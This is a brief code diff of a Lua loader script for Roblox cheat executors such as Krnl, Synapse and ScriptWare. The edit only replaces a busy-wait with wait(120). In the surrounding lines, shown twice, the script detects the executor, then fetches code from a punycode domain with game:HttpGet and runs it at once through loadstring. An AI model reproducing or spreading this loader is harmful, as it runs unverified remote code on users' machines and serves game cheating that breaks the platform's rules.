@@ -22,8 +22,7 @@ if (not success) then
     local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
     loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
 end
-local start = tick()
-repeat wait() until tick() - start >= 120
+wait(120)
 if not getgenv().ScriptReady then
     local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
     loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
